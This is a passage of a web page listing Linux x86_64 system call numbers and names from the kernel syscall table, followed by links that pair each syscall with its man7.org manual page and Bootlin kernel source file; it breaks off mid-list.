common setsid sys_setsid113 common setreuid sys_setreuid114 common setregid sys_setregid115 common getgroups sys_getgroups116 common setgroups sys_setgroups117 common setresuid sys_setresuid118 common getresuid sys_getresuid119 common setresgid sys_setresgid120 common getresgid sys_getresgid121 common getpgid sys_getpgid122 common setfsuid sys_setfsuid123 common setfsgid sys_setfsgid124 common getsid sys_getsid125 common capget sys_capget126 common capset sys_capset127 64 rt_sigpending sys_rt_sigpending128 64 rt_sigtimedwait sys_rt_sigtimedwait129 64 rt_sigqueueinfo sys_rt_sigqueueinfo130 common rt_sigsuspend sys_rt_sigsuspend131 64 sigaltstack sys_sigaltstack132 common utime sys_utime133 common mknod sys_mknod134 64 uselib135 common personality sys_personality136 common ustat sys_ustat137 common statfs sys_statfs138 common fstatfs sys_fstatfs139 common sysfs sys_sysfs140 common getpriority sys_getpriority141 common setpriority sys_setpriority142 common sched_setparam sys_sched_setparam143 common sched_getparam sys_sched_getparam144 common sched_setscheduler sys_sched_setscheduler145 common sched_getscheduler sys_sched_getscheduler146 common sched_get_priority_max sys_sched_get_priority_max147 common sched_get_priority_min sys_sched_get_priority_min148 common sched_rr_get_interval sys_sched_rr_get_interval149 common mlock sys_mlock150 common munlock sys_munlock151 common mlockall sys_mlockall152 common munlockall sys_munlockall153 common vhangup sys_vhangup154 common modify_ldt sys_modify_ldt155 common pivot_root sys_pivot_root156 64 _sysctl sys_ni_syscall157 common prctl sys_prctl158 common arch_prctl sys_arch_prctl159 common adjtimex sys_adjtimex160 common setrlimit sys_setrlimit161 common chroot sys_chroot162 common sync sys_sync163 common acct sys_acct164 common settimeofday sys_settimeofday165 common mount sys_mount166 common umount2 sys_umount167 common swapon sys_swapon168 common swapoff sys_swapoff169 common reboot sys_reboot170 common sethostname sys_sethostname171 common setdomainname sys_setdomainname172 common iopl sys_iopl173 common ioperm sys_ioperm174 64 create_module175 common init_module sys_init_module176 common delete_module sys_delete_module177 64 get_kernel_syms178 64 query_module179 common quotactl sys_quotactl180 64 nfsservctl181 common getpmsg182 common putpmsg183 common afs_syscall184 common tuxcall185 common security186 common gettid sys_gettid187 common readahead sys_readahead188 common setxattr sys_setxattr189 common lsetxattr sys_lsetxattr190 common fsetxattr sys_fsetxattr191 common getxattr sys_getxattr192 common lgetxattr sys_lgetxattr193 common fgetxattr sys_fgetxattr194 common listxattr sys_listxattr195 common llistxattr sys_llistxattr196 common flistxattr sys_flistxattr197 common removexattr sys_removexattr198 common lremovexattr sys_lremovexattr199 common fremovexattr sys_fremovexattr200 common tkill sys_tkill201 common time sys_time202 common futex sys_futex203 common sched_setaffinity sys_sched_setaffinity204 common sched_getaffinity sys_sched_getaffinity205 64 set_thread_area206 64 io_setup sys_io_setup207 common io_destroy sys_io_destroy208 common io_getevents sys_io_getevents209 64 io_submit sys_io_submit210 common io_cancel sys_io_cancel211 64 get_thread_area212 common lookup_dcookie213 common epoll_create sys_epoll_create214 64 epoll_ctl_old215 64 epoll_wait_old216 common remap_file_pages sys_remap_file_pages217 common getdents64 sys_getdents64218 common set_tid_address sys_set_tid_address219 common restart_syscall sys_restart_syscall220 common semtimedop sys_semtimedop221 common fadvise64 sys_fadvise64222 64 timer_create sys_timer_create223 common timer_settime sys_timer_settime224 common timer_gettime sys_timer_gettime225 common timer_getoverrun sys_timer_getoverrun226 common timer_delete sys_timer_delete227 common clock_settime sys_clock_settime228 common clock_gettime sys_clock_gettime229 common clock_getres sys_clock_getres230 common clock_nanosleep sys_clock_nanosleep231 common exit_group sys_exit_group232 common epoll_wait sys_epoll_wait233 common epoll_ctl sys_epoll_ctl234 common tgkill sys_tgkill235 common utimes sys_utimes236 64 vserver237 common mbind sys_mbind238 common set_mempolicy sys_set_mempolicy239 common get_mempolicy sys_get_mempolicy240 common mq_open sys_mq_open241 common mq_unlink sys_mq_unlink242 common mq_timedsend sys_mq_timedsend243 common mq_timedreceive sys_mq_timedreceive244 64 mq_notify sys_mq_notify245 common mq_getsetattr sys_mq_getsetattr246 64 kexec_load sys_kexec_load247 64 waitid sys_waitid248 common add_key sys_add_key249 common request_key sys_request_key250 common keyctl sys_keyctl251 common ioprio_set sys_ioprio_set252 common ioprio_get sys_ioprio_get253 common inotify_init sys_inotify_init254 common inotify_add_watch sys_inotify_add_watch255 common inotify_rm_watch sys_inotify_rm_watch256 common migrate_pages sys_migrate_pages257 common openat sys_openat258 common mkdirat sys_mkdirat259 common mknodat sys_mknodat260 common fchownat sys_fchownat261 common futimesat sys_futimesat262 common newfstatat sys_newfstatat263 common unlinkat sys_unlinkat264 common renameat sys_renameat265 common linkat sys_linkat266 common symlinkat sys_symlinkat267 common readlinkat sys_readlinkat268 common fchmodat sys_fchmodat269 common faccessat sys_faccessat270 common pselect6 sys_pselect6271 common ppoll sys_ppoll272 common unshare sys_unshare273 64 set_robust_list sys_set_robust_list274 64 get_robust_list sys_get_robust_list275 common splice sys_splice276 common tee sys_tee277 common sync_file_range sys_sync_file_range278 64 vmsplice sys_vmsplice279 64 move_pages sys_move_pages280 common utimensat sys_utimensat281 common epoll_pwait sys_epoll_pwait282 common signalfd sys_signalfd283 common timerfd_create sys_timerfd_create284 common eventfd sys_eventfd285 common fallocate sys_fallocate286 common timerfd_settime sys_timerfd_settime287 common timerfd_gettime sys_timerfd_gettime288 common accept4 sys_accept4289 common signalfd4 sys_signalfd4290 common eventfd2 sys_eventfd2291 common epoll_create1 sys_epoll_create1292 common dup3 sys_dup3293 common pipe2 sys_pipe2294 common inotify_init1 sys_inotify_init1295 64 preadv sys_preadv296 64 pwritev sys_pwritev297 64 rt_tgsigqueueinfo sys_rt_tgsigqueueinfo298 common perf_event_open sys_perf_event_open299 64 recvmmsg sys_recvmmsg300 common fanotify_init sys_fanotify_init301 common fanotify_mark sys_fanotify_mark302 common prlimit64 sys_prlimit64303 common name_to_handle_at sys_name_to_handle_at304 common open_by_handle_at sys_open_by_handle_at305 common clock_adjtime sys_clock_adjtime306 common syncfs sys_syncfs307 64 sendmmsg sys_sendmmsg308 common setns sys_setns309 common getcpu sys_getcpu310 64 process_vm_readv sys_process_vm_readv311 64 process_vm_writev sys_process_vm_writev312 common kcmp sys_kcmp313 common finit_module sys_finit_module314 common sched_setattr sys_sched_setattr315 common sched_getattr sys_sched_getattr316 common renameat2 sys_renameat2317 common seccomp sys_seccomp318 common getrandom sys_getrandom319 common memfd_create sys_memfd_create320 common kexec_file_load sys_kexec_file_load321 common bpf sys_bpf322 64 execveat sys_execveat323 common userfaultfd sys_userfaultfd324 common membarrier sys_membarrier325 common mlock2 sys_mlock2326 common copy_file_range sys_copy_file_range327 64 preadv2 sys_preadv2328 64 pwritev2 sys_pwritev2329 common pkey_mprotect sys_pkey_mprotect330 common pkey_alloc sys_pkey_alloc331 common pkey_free sys_pkey_free332 common statx sys_statx333 common io_pgetevents sys_io_pgetevents334 common rseq sys_rseq# don&#x27;t use numbers 387 through 423, add new calls after the last# &#x27;common&#x27; entry424 common pidfd_send_signal sys_pidfd_send_signal425 common io_uring_setup sys_io_uring_setup426 common io_uring_enter sys_io_uring_enter427 common io_uring_register sys_io_uring_register428 common open_tree sys_open_tree429 common move_mount sys_move_mount430 common fsopen sys_fsopen431 common fsconfig sys_fsconfig432 common fsmount sys_fsmount433 common fspick sys_fspick434 common pidfd_open sys_pidfd_open435 common clone3 sys_clone3436 common close_range sys_close_range437 common openat2 sys_openat2438 common pidfd_getfd sys_pidfd_getfd439 common faccessat2 sys_faccessat2440 common process_madvise sys_process_madvise441 common epoll_pwait2 sys_epoll_pwait2442 common mount_setattr sys_mount_setattr443 common quotactl_fd sys_quotactl_fd444 common landlock_create_ruleset sys_landlock_create_ruleset445 common landlock_add_rule sys_landlock_add_rule446 common landlock_restrict_self sys_landlock_restrict_self447 common memfd_secret sys_memfd_secret448 common process_mrelease sys_process_mrelease449 common futex_waitv sys_futex_waitv450 common set_mempolicy_home_node sys_set_mempolicy_home_node451 common cachestat sys_cachestat452 common fchmodat2 sys_fchmodat2453 64 map_shadow_stack sys_map_shadow_stack454 common futex_wake sys_futex_wake455 common futex_wait sys_futex_wait456 common futex_requeue sys_futex_requeue## Due to a historical design error, certain syscalls are numbered differently# in x32 as compared to native x86_64. These syscalls have numbers 512-547.# Do not add new syscalls to this range. Numbers 548 and above are available# for non-x32 use.#512 x32 rt_sigaction compat_sys_rt_sigaction513 x32 rt_sigreturn compat_sys_x32_rt_sigreturn514 x32 ioctl compat_sys_ioctl515 x32 readv sys_readv516 x32 writev sys_writev517 x32 recvfrom compat_sys_recvfrom518 x32 sendmsg compat_sys_sendmsg519 x32 recvmsg compat_sys_recvmsg520 x32 execve compat_sys_execve521 x32 ptrace compat_sys_ptrace522 x32 rt_sigpending compat_sys_rt_sigpending523 x32 rt_sigtimedwait compat_sys_rt_sigtimedwait_time64524 x32 rt_sigqueueinfo compat_sys_rt_sigqueueinfo525 x32 sigaltstack compat_sys_sigaltstack526 x32 timer_create compat_sys_timer_create527 x32 mq_notify compat_sys_mq_notify528 x32 kexec_load compat_sys_kexec_load529 x32 waitid compat_sys_waitid530 x32 set_robust_list compat_sys_set_robust_list531 x32 get_robust_list compat_sys_get_robust_list532 x32 vmsplice sys_vmsplice533 x32 move_pages sys_move_pages534 x32 preadv compat_sys_preadv64535 x32 pwritev compat_sys_pwritev64536 x32 rt_tgsigqueueinfo compat_sys_rt_tgsigqueueinfo537 x32 recvmmsg compat_sys_recvmmsg_time64538 x32 sendmmsg compat_sys_sendmmsg539 x32 process_vm_readv sys_process_vm_readv540 x32 process_vm_writev sys_process_vm_writev541 x32 setsockopt sys_setsockopt542 x32 getsockopt sys_getsockopt543 x32 io_setup compat_sys_io_setup544 x32 io_submit compat_sys_io_submit545 x32 execveat compat_sys_execveat546 x32 preadv2 compat_sys_preadv64v2547 x32 pwritev2 compat_sys_pwritev64v2# This is the end of the legacy x32 range. Numbers 548 and above are# not special and are not to be used for x32-specific syscalls. read&#x2F;sys_readread(2) - Linux manual page (man7.org) read_write.c - fs&#x2F;read_write.c - Linux source code (v6.6.6) - Bootlin write&#x2F;sys_writewrite(2) - Linux manual page (man7.org) read_write.c - fs&#x2F;read_write.c - Linux source code (v6.6.6) - Bootlin open&#x2F;sys_open | openat&#x2F;sys_openat | creat&#x2F;sys_creatopen(2) - Linux manual page (man7.org) open.c - fs&#x2F;open.c - Linux source code (v6.6.6) - Bootlin close&#x2F;sys_closeclose(2) - Linux manual page (man7.org) open.c - fs&#x2F;open.c - Linux source code (v6.6.6) - Bootlin stat&#x2F;sys_newstat | fstat&#x2F;sys_newfstat | lstat&#x2F;sys_newlstatstat(2) - Linux manual page (man7.org) stat.c - fs&#x2F;stat.c - Linux source code (v6.6.6) - Bootlin poll&#x2F;sys_pollpoll(2) - Linux manual page (man7.org) select.c - fs&#x2F;select.c - Linux source code (v6.6.6) - Bootlin lseek&#x2F;sys_lseeklseek(2) - Linux manual page (man7.org) sys_lseek identifier - Linux source code (v6.6.6) - Bootlin mmap&#x2F;sys_mmap | mumap&#x2F;sys_mumapmmap(2) - Linux manual page (man7.org) sys.c - arch&#x2F;arm64&#x2F;kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin mmap.c - mm&#x2F;mmap.c - Linux source code (v6.6.6) - Bootlin mprotect&#x2F;sys_mprotectmprotect(2) - Linux manual page (man7.org) sys_mprotect identifier - Linux source code (v6.6.6) - Bootlin brk&#x2F;sys_brkbrk(2) - Linux manual page (man7.org) mmap.c - mm&#x2F;mmap.c - Linux source code (v6.6.6) - Bootlin rt_sigaction&#x2F;sys_rt_sigaction | sigactionsigaction(2) - Linux manual page (man7.org) signal.c - kernel&#x2F;signal.c - Linux source code (v6.6.6) - Bootlin rt_sigprocmask&#x2F;sys_rt_sigprocmask | sigprocmasksigprocmask(2) - Linux manual page (man7.org) signal.c - kernel&#x2F;signal.c - Linux source code (v6.6.6) - Bootlin rt_sigreturn&#x2F;sys_rt_sigreturn | sigreturnsigreturn(2) - Linux manual page (man7.org) signal.c - arch&#x2F;arm64&#x2F;kernel&#x2F;signal.c - Linux source code (v6.6.6) - Bootlin ioctl&#x2F;sys_ioctlioctl(2) - Linux manual page (man7.org) ioctl.c - fs&#x2F;ioctl.c - Linux source code (v6.6.6) - Bootlin pread64&#x2F;sys_pthread64| pwrite64&#x2F;sys_pwrite64pread(2) - Linux manual page (man7.org) read_write.c - fs&#x2F;read_write.c - Linux source code (v6.6.6) - Bootlin read_write.c - fs&#x2F;read_write.c - Linux source code (v6.6.6) - Bootlin readv&#x2F;sys_readv | writev&#x2F;sys_writev | preadv&#x2F;sys_preadv | pwritev&#x2F;sys_pwritev | preadv2&#x2F;sys_preadv2 | pwritev2&#x2F;sys_pwritev2readv(2) - Linux manual page (man7.org) read_write.c - fs&#x2F;read_write.c - Linux source code (v6.6.6) - Bootlin access&#x2F;sys_access | faccessat&#x2F;sys_faccessat | faccessat2&#x2F;sys_faccessat2access(2) - Linux manual page (man7.org) read_write.c - fs&#x2F;read_write.c - Linux source code (v6.6.6) - Bootlin pipe&#x2F;sys_pipe | pipe2&#x2F;sys_pipe2pipe(2) - Linux manual page (man7.org) pipe.c - fs&#x2F;pipe.c - Linux source code (v6.6.6) - Bootlin select&#x2F;sys_select | pselect6&#x2F;sys_pselect6select(2) - Linux manual page (man7.org) select.c - fs&#x2F;select.c - Linux source code (v6.6.6) - Bootlin select.c - fs&#x2F;select.c - Linux source code (v6.6.6) - Bootlin sched_yield&#x2F;sys_sched_yieldsched_yield(2) - Linux manual page (man7.org) core.c - kernel&#x2F;sched&#x2F;core.c - Linux source code (v6.6.6) - Bootlin mremap&#x2F;sys_mremapmremap(2) - Linux manual page (man7.org) mremap.c - mm&#x2F;mremap.c - Linux source code (v6.6.6) - Bootlin msync&#x2F;sys_msyncmsync(2) - Linux manual page (man7.org) msync.c - mm&#x2F;msync.c - Linux source code (v6.6.6) - Bootlin mincore&#x2F;sys_mincoremincore(2) - Linux manual page (man7.org) mincore.c - mm&#x2F;mincore.c - Linux source code (v6.6.6) - Bootlin madvise&#x2F;sys_madvisemadvise(2) - Linux manual page (man7.org) madvise.c - mm&#x2F;madvise.c - Linux source code (v6.6.6) - Bootlin shmget&#x2F;sys_shmgetshmget(2) - Linux manual page (man7.org) shm.c - ipc&#x2F;shm.c - Linux source code (v6.6.6) - Bootlin shmat&#x2F;sys_shmat | shmdt&#x2F;sys_shmdtshmop(2) - Linux manual page (man7.org) shm.c - ipc&#x2F;shm.c - Linux source code (v6.6.6) - Bootlin shm.c - ipc&#x2F;shm.c - Linux source code (v6.6.6) - Bootlin shmctl&#x2F;sys_shmctlshmctl(2) - Linux manual page (man7.org) shm.c - ipc&#x2F;shm.c - Linux source code (v6.6.6) - Bootlin dup&#x2F;sys_dup | dup2&#x2F;sys_dup2 | dup3&#x2F;sys_dup3dup(2) - Linux manual page (man7.org) file.c - fs&#x2F;file.c - Linux source code (v6.6.6) - Bootlin pause&#x2F;sys_pausepause(2) - Linux manual page (man7.org) signal.c - kernel&#x2F;signal.c - Linux source code (v6.6.6) - Bootlin nanosleep&#x2F;sys_nanosleepnanosleep(2) - Linux manual page (man7.org) hrtimer.c - kernel&#x2F;time&#x2F;hrtimer.c - Linux source code (v6.6.6) - Bootlin getitimer&#x2F;sys_getitimer | setitimer&#x2F;sys_setitimergetitimer(2) - Linux manual page (man7.org) itimer.c - kernel&#x2F;time&#x2F;itimer.c - Linux source code (v6.6.6) - Bootlin itimer.c - kernel&#x2F;time&#x2F;itimer.c - Linux source code (v6.6.6) - Bootlin alarm&#x2F;sys_alarmalarm(2) - Linux manual page (man7.org) itimer.c - kernel&#x2F;time&#x2F;itimer.c - Linux source code (v6.6.6) - Bootlin getpid&#x2F;sys_getpid | getppid&#x2F;sys_getppidgetpid(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin sendfile&#x2F;sys_sendfile64sendfile(2) - Linux manual page (man7.org) read_write.c - fs&#x2F;read_write.c - Linux source code (v6.6.6) - Bootlin socket&#x2F;sys_socketsocket(2) - Linux manual page (man7.org) socket.c - net&#x2F;socket.c - Linux source code (v6.6.6) - Bootlin connect&#x2F;sys_connectconnect(2) - Linux manual page (man7.org) socket.c - net&#x2F;socket.c - Linux source code (v6.6.6) - Bootlin accept&#x2F;sys_accept | accept4&#x2F;sys_accept4accept(2) - Linux manual page (man7.org) socket.c - net&#x2F;socket.c - Linux source code (v6.6.6) - Bootlin send&#x2F;sys_send | sendto&#x2F;sys_sendto| sendmsg&#x2F;sys_sendmsgsend(2) - Linux manual page (man7.org) socket.c - net&#x2F;socket.c - Linux source code (v6.6.6) - Bootlin socket.c - net&#x2F;socket.c - Linux source code (v6.6.6) - Bootlin recv&#x2F;sys_recv | recvfrom&#x2F;sys_recvfrom | recvmsg&#x2F;sys_recvmsgrecv(2) - Linux manual page (man7.org) socket.c - net&#x2F;socket.c - Linux source code (v6.6.6) - Bootlin socket.c - net&#x2F;socket.c - Linux source code (v6.6.6) - Bootlin socket.c - net&#x2F;socket.c - Linux source code (v6.6.6) - Bootlin shutdown&#x2F;sys_shutdownshutdown(2) - Linux manual page (man7.org) socket.c - net&#x2F;socket.c - Linux source code (v6.6.6) - Bootlin bind&#x2F;sys_bindbind(2) - Linux manual page (man7.org) socket.c - net&#x2F;socket.c - Linux source code (v6.6.6) - Bootlin listen&#x2F;sys_listenlisten(2) - Linux manual page (man7.org) socket.c - net&#x2F;socket.c - Linux source code (v6.6.6) - Bootlin getsockname&#x2F;sys_getsocknamegetsockname(2) - Linux manual page (man7.org) socket.c - net&#x2F;socket.c - Linux source code (v6.6.6) - Bootlin getpeername&#x2F;sys_getpeernamegetpeername(2) - Linux manual page (man7.org) socket.c - net&#x2F;socket.c - Linux source code (v6.6.6) - Bootlin socketpair&#x2F;sys_socketpairsocketpair(2) - Linux manual page (man7.org) socket.c - net&#x2F;socket.c - Linux source code (v6.6.6) - Bootlin getsockopt&#x2F;sys_getsockopt | setsockopt&#x2F;sys_setsockoptgetsockopt(2) - Linux manual page (man7.org) socket.c - net&#x2F;socket.c - Linux source code (v6.6.6) - Bootlin socket.c - net&#x2F;socket.c - Linux source code (v6.6.6) - Bootlin clone&#x2F;sys_clone | clone3&#x2F;sys_clone3clone(2) - Linux manual page (man7.org) fork.c - kernel&#x2F;fork.c - Linux source code (v6.6.6) - Bootlin fork.c - kernel&#x2F;fork.c - Linux source code (v6.6.6) - Bootlin fork&#x2F;sys_forkfork(2) - Linux manual page (man7.org) fork.c - kernel&#x2F;fork.c - Linux source code (v6.6.6) - Bootlin vfork&#x2F;sys_vforkvfork(2) - Linux manual page (man7.org) fork.c - kernel&#x2F;fork.c - Linux source code (v6.6.6) - Bootlin execve&#x2F;sys_execveexecve(2) - Linux manual page (man7.org) exec.c - fs&#x2F;exec.c - Linux source code (v6.6.6) - Bootlin exit&#x2F;sys_exit_exit(2) - Linux manual page (man7.org) exit.c - kernel&#x2F;exit.c - Linux source code (v6.6.6) - Bootlin wait4&#x2F;sys_wait4wait4(2) - Linux manual page (man7.org) exit.c - kernel&#x2F;exit.c - Linux source code (v6.6.6) - Bootlin kill&#x2F;sys_killkill(2) - Linux manual page (man7.org) signal.c - kernel&#x2F;signal.c - Linux source code (v6.6.6) - Bootlin uname&#x2F;sys_newunameuname(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin semget&#x2F;sys_semgetsemget(2) - Linux manual page (man7.org) sem.c - ipc&#x2F;sem.c - Linux source code (v6.6.6) - Bootlin semop&#x2F;sys_semop | semtimedopsemop(2) - Linux manual page (man7.org) sem.c - ipc&#x2F;sem.c - Linux source code (v6.6.6) - Bootlin sem.c - ipc&#x2F;sem.c - Linux source code (v6.6.6) - Bootlin semctl&#x2F;sys_semctlsemctl(2) - Linux manual page (man7.org) sem.c - ipc&#x2F;sem.c - Linux source code (v6.6.6) - Bootlin msgget&#x2F;sys_msggetmsgget(2) - Linux manual page (man7.org) msg.c - ipc&#x2F;msg.c - Linux source code (v6.6.6) - Bootlin msgrcv&#x2F;sys_msgrcv | msgsnd&#x2F;sys_msgsndmsgop(2) - Linux manual page (man7.org) msg.c - ipc&#x2F;msg.c - Linux source code (v6.6.6) - Bootlin msg.c - ipc&#x2F;msg.c - Linux source code (v6.6.6) - Bootlin msgctl&#x2F;sys_msgctlmsgctl(2) - Linux manual page (man7.org) msg.c - ipc&#x2F;msg.c - Linux source code (v6.6.6) - Bootlin fcntl&#x2F;sys_fcntlfcntl(2) - Linux manual page (man7.org) fcntl.c - fs&#x2F;fcntl.c - Linux source code (v6.6.6) - Bootlin flock&#x2F;sys_flockflock(2) - Linux manual page (man7.org) locks.c - fs&#x2F;locks.c - Linux source code (v6.6.6) - Bootlin fsync&#x2F;sys_fsync | fdatasync&#x2F;sys_fdatasyncfsync(2) - Linux manual page (man7.org) sync.c - fs&#x2F;sync.c - Linux source code (v6.6.6) - Bootlin sync.c - fs&#x2F;sync.c - Linux source code (v6.6.6) - Bootlin truncate&#x2F;sys_truncate | ftruncate&#x2F;sys_ftruncatetruncate(2) - Linux manual page (man7.org) open.c - fs&#x2F;open.c - Linux source code (v6.6.6) - Bootlin open.c - fs&#x2F;open.c - Linux source code (v6.6.6) - Bootlin getdents&#x2F;sys_getdents | getdents64&#x2F;sys_getdents64getdents(2) - Linux manual page (man7.org) readdir.c - fs&#x2F;readdir.c - Linux source code (v6.6.6) - Bootlin readdir.c - fs&#x2F;readdir.c - Linux source code (v6.6.6) - Bootlin getcwd&#x2F;sys_getcwdd_path.c - fs&#x2F;d_path.c - Linux source code (v6.6.6) - Bootlin](https://man7.org/linux/man-pages/man3/getcwd.3.html) chdir&#x2F;sys_chdir | fchdir&#x2F;sys_fchdirchdir(2) - Linux manual page (man7.org) open.c - fs&#x2F;open.c - Linux source code (v6.6.6) - Bootlin open.c - fs&#x2F;open.c - Linux source code (v6.6.6) - Bootlin rename&#x2F;sys_rename | renameat&#x2F;sys_renameat | renameat2&#x2F;sys_renameat2rename(2) - Linux manual page (man7.org) namei.c - fs&#x2F;namei.c - Linux source code (v6.6.6) - Bootlin mkdir&#x2F;sys_mkdir | mkdirat&#x2F;sys_mkdiratmkdir(2) - Linux manual page (man7.org) namei.c - fs&#x2F;namei.c - Linux source code (v6.6.6) - Bootlin rmdir&#x2F;sys_rmdirrmdir(2) - Linux manual page (man7.org) namei.c - fs&#x2F;namei.c - Linux source code (v6.6.6) - Bootlin open.c - fs&#x2F;open.c - Linux source code (v6.6.6) - Bootlin link&#x2F;sys_link | linkat&#x2F;sys_linkatlink(2) - Linux manual page (man7.org) namei.c - fs&#x2F;namei.c - Linux source code (v6.6.6) - Bootlin unlink&#x2F;sys_unlink | unlinkat&#x2F;sys_unlinkatunlink(2) - Linux manual page (man7.org) namei.c - fs&#x2F;namei.c - Linux source code (v6.6.6) - Bootlin symlink&#x2F;sys_symlink | symlinkat&#x2F;sys_symlinkatsymlink(2) - Linux manual page (man7.org) namei.c - fs&#x2F;namei.c - Linux source code (v6.6.6) - Bootlin readlink&#x2F;sys_readlink| readlinkat&#x2F;sys_readlinkatreadlink(2) - Linux manual page (man7.org) stat.c - fs&#x2F;stat.c - Linux source code (v6.6.6) - Bootlin chmod&#x2F;sys_chmod | fchmod&#x2F;sys_fchmod | fchmodat&#x2F;sys_fchmodat | fchmodat2&#x2F;sys_fchmodat2chmod(2) - Linux manual page (man7.org) open.c - fs&#x2F;open.c - Linux source code (v6.6.6) - Bootlin open.c - fs&#x2F;open.c - Linux source code (v6.6.6) - Bootlin chown&#x2F;sys_chown | fchown&#x2F;sys_fchown | lchown&#x2F;sys_chown | fchownat&#x2F;sys_fchownatchown(2) - Linux manual page (man7.org) open.c - fs&#x2F;open.c - Linux source code (v6.6.6) - Bootlin open.c - fs&#x2F;open.c - Linux source code (v6.6.6) - Bootlin umask&#x2F;sys_umaskumask(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin gettimeofday&#x2F;sys_gettimeofday | settimeofday&#x2F;sys_settimeofdaygettimeofday(2) - Linux manual page (man7.org) time.c - kernel&#x2F;time&#x2F;time.c - Linux source code (v6.6.6) - Bootlin time.c - kernel&#x2F;time&#x2F;time.c - Linux source code (v6.6.6) - Bootlin getrlimit&#x2F;sys_getrlimit | setrlimit&#x2F;sys_setrlimit | prlimit64&#x2F;sys_prlimit64getrlimit(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin getrusage&#x2F;sys_getrusagegetrusage(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin sysinfo&#x2F;sys_sysinfosysinfo(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin times&#x2F;sys_timestimes(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin ptrace&#x2F;sys_ptraceptrace(2) - Linux manual page (man7.org) ptrace.c - kernel&#x2F;ptrace.c - Linux source code (v6.6.6) - Bootlin getuid&#x2F;sys_getuid | geteuid&#x2F;sys_geteuidgetuid(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin syslog&#x2F;sys_syslogsyslog(2) - Linux manual page (man7.org) printk.c - kernel&#x2F;printk&#x2F;printk.c - Linux source code (v6.6.6) - Bootlin getgid&#x2F;sys_getgid | getegid&#x2F;sys_getegidgetgid(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin setuid&#x2F;sys_setuidsetuid(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin setgid&#x2F;sys_setgidsetgid(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin setpgid&#x2F;sys_setpgid | getpgid&#x2F;sys_getpgid | getpgrp&#x2F;sys_getpgrpsetpgid(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin setsid&#x2F;sys_setsidsetsid(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin setreuid&#x2F;sys_setreuid | setregid&#x2F;sys_setregidsetreuid(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin getgroups&#x2F;sys_getgroups | setgroups&#x2F;sys_setgroupsgetgroups(2) - Linux manual page (man7.org) groups.c - kernel&#x2F;groups.c - Linux source code (v6.6.6) - Bootlin groups.c - kernel&#x2F;groups.c - Linux source code (v6.6.6) - Bootlin setresuid&#x2F;sys_setresuid | setresgid&#x2F;sys_setresgidsetresuid(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin getresuid&#x2F;sys_getresuid | getresgid&#x2F;sys_getresgidgetresuid(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin setfsuid&#x2F;sys_setfsuidsetfsuid(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin setfsgid&#x2F;sys_setfsgidsetfsgid(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin getsid&#x2F;sys_getsidgetsid(2) - Linux manual page (man7.org) sys.c - kernel&#x2F;sys.c - Linux source code (v6.6.6) - Bootlin capget&#x2F;sys_capget | capset&#x2F;sys_capsetcapget(2) - Linux manual page (man7.org) capability.c - kernel&#x2F;capability.c - Linux source code (v6.6.6) - Bootlin capability.c - kernel&#x2F;capability.c - Linux source code (v6.6.6) - Bootlin rt_sigpending&#x2F;sys_rt_sigpendingsigpending(2) - Linux manual page (man7.org) signal.c - kernel&#x2F;signal.c - Linux source code (v6.6.6) - Bootlin rt_sigtimewait&#x2F;sys_rt_sigtimewaitsigwaitinfo(2) - Linux manual page (man7.org) signal.c - kernel&#x2F;signal.c - Linux source code (v6.6.6) - Bootlin rt_sigqueueinfo&#x2F;sys_rt_sigqueueinfo | rt_tgsigqueueinfo | sys_rt_tgsigqueueinfort_sigqueueinfo(2) - Linux manual page (man7.org) signal.c - kernel&#x2F;signal.c - Linux source code (v6.6.6) - Bootlin signal.c - kernel&#x2F;signal.c - Linux source code (v6.6.6) - Bootlin rt_sigsuspend&#x2F;sys_rt_sigsuspendsigsuspend(2) - Linux manual page (man7.org) signal.c - kernel&#x2F;signal.c - Linux source code (v6.6.6) - Bootlin sigaltstack&#x2F;sys_sigaltstacksigaltstack(2) - Linux manual page (man7.org) signal.c - kernel&#x2F;signal.c - Linux source code (v6.6.6) - Bootlin utime&#x2F;sys_utime | utimes&#x2F;sys_utimesutime(2) - Linux manual page (man7.org) utimes.c - fs&#x2F;utimes.c - Linux source code (v6.6.6) - Bootlin utimes.c - fs&#x2F;utimes.c - Linux source code (v6.6.6) - Bootlin mknod&#x2F;sys_mknod | 